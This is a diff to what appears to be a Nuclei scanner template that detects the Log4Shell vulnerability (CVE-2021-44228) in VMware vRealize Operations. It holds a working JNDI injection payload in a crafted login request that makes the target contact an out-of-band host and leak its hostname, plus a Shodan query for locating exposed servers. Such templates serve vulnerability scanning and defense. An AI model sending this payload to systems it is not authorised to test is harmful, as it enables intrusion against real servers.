@@ -17,17 +17,10 @@ info:
     cvss-score: 10
     cve-id: CVE-2021-44228
     cwe-id: CWE-77
-    cpe: cpe:2.3:a:vmware:vrealize_operations:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
-    max-request: 1
     shodan-query: http.title:"vRealize Operations Tenant App"
-    product: vrealize_operations
-    vendor: vmware
+    verified: "true"
   tags: cve,cve2021,oast,rce,log4j,vmware,vrealize,kev
-variables:
-  rand1: '{{rand_int(111, 999)}}'
-  rand2: '{{rand_int(111, 999)}}'
 
 http:
   - raw:
@@ -38,34 +31,25 @@ http:
         Origin: {{RootURL}}
         Referer: {{RootURL}}/ui/
 
-        {"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}","password":"admin"}
+        {"username":"${jndi:ldap://${hostName}.{{interactsh-url}}}","password":"admin"}
 
     matchers-condition: and
     matchers:
       - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
+        part: interactsh_protocol
         words:
-          - "dns"
+          - "dns"  # Confirms the DNS Interaction
 
       - type: regex
         part: interactsh_request
         regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
 
     extractors:
-      - type: kval
-        kval:
-          - interactsh_ip
-
-      - type: regex
-        part: interactsh_request
-        group: 2
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
       - type: regex
         part: interactsh_request
         group: 1
         regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-# digest: 4b0a00483046022100ee0832a980b0fd15cd30ef62e036059a225458ea86c6746da3d146835f2a4f410221008eaf97ea24722963647cd8b465e7b664035db5ab08258ec44522492a5d614797:922c64590222798bb761d5b6d8e72950
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
+
+# Enhanced by mp on 2022/04/05
